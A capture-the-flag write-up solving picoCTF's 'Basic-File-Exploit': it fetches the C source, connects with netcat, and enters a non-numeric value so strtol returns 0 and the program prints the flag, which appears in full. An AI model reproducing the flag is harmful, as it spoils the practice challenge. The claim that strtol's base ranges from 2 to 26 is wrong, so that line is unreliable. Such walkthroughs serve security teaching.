# Basic-File-Exploit

## FLAG: picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}

## Status: Complete

Category: Binary-Exploit

Description: The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat: nc saturn.picoctf.net 55825 The program's source code with the flag redacted can be downloaded here.

## STEPS

1. > wget <https://artifacts.picoctf.net/c/542/program-redacted.c>
2. > nc saturn.picoctf.net 55825
3. Examine the source code

    ```c
    static void data_read() {
    char entry[4];
    long entry_number;
    char output[100];
    int r;

    memset(output, '\0', 100);
    
    printf("Please enter the entry number of your data:\n");
    r = tgetinput(entry, 4);
    // Timeout on user input
    if(r == -3)
    {
        printf("Goodbye!\n");
        exit(0);
    }
    
    if ((entry_number = strtol(entry, NULL, 10)) == 0) {
        puts(flag);
        fseek(stdin, 0, SEEK_END);
        exit(0);
    }

    entry_number--;
    strncpy(output, data[entry_number], input_lengths[entry_number]);
    puts(output);
    }
    ```

4. In the source code we see that the `data_read()` function has the ability to leak the flag
5. Let's figure out what the strtol() function does
   1. strtol() converts initial part of str to a long int based on the provided base which can be between 2 and 26
   2. We see that the 10 means we are in base 10 or normal decimal
   3. To break free from this lets try something that isn't 'convertable to long'
6. > nc saturn.picoctf.net 55825
   1. Select option: `1`
   2. Enter Data: `Anything_Can_Go_Here`
   3. Enter Length: `10` or anyother number (it doesnt matter which value)
   4. Write Successful, would you like to do anything else?: `ANY_CHAR` (not number)
      1. Here is where we type in any character since it is NOT convertable to long
      2. RESPONSE: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}`
